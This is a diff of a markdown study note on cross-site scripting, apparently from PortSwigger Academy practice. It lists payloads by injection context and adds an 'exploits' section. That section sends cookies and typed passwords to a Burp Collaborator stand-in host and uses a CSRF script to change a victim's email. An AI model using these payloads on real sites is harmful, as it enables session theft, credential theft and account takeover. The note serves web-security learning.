@@ -11,6 +11,7 @@ in [[cause & sinks#stored|this]] case:
 in [[cause & sinks#DOM-based|this]] case
 > `"><svg onload=alert(1)>`
 
+---
 # contexts
 ## between HTML tags
 ##### most tags and attributes blocked
@@ -43,3 +44,45 @@ context: `<a href="#" onclick="... var input='controllable data here'; ...">`
 ##### XSS in JavaScript template literals
 context: ``<script> ... var input = `controllable data here`; ... </script>`` 
 - `${alert(1)}`
+
+## XSS via client-side template injection
+...
+
+---
+# exploits
+## to steal cookies
+
+```html
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST', mode: 'no-cors', body:document.cookie });
+</script>
+```
+
+## to capture passwords
+
+```html
+<input name=username id=username> 
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+```
+
+## to perform CSRF
+
+```html
+<script> 
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+var changeReq = new XMLHttpRequest();
+changeReq.open('post', '/my-account/change-email', true);
+changeReq.send('csrf='+token+'&email=test@test.com') };
+</script>
+```
+
+---
+
+[XSS cheat-sheet from portswigger academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+/gitco
